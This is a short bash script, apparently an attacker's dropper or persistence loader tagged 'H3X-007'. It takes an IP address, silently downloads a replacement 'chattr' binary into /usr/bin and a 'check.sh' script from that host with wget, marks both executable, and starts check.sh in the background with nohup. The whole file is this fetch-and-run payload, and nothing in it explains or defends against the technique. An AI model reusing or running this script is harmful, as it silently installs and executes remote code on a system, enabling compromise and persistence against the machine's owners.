#!/bin/bash
#H3X-007 :)
script_path="/home/.../check.sh"
ip_address="$1"

if [ -z "$ip_address" ]; then
    exit 1
fi

chattr_path="/usr/bin/chattr"

if [ ! -f "$chattr_path" ]; then
    wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
    chmod +x "$chattr_path"
fi

if [ ! -f "$script_path" ]; then
    wget "http://$ip_address/check.sh" -O "$script_path" >/dev/null 2>&1
    chmod +x "$script_path"
    nohup "$script_path" >/dev/null 2>&1 &
fi
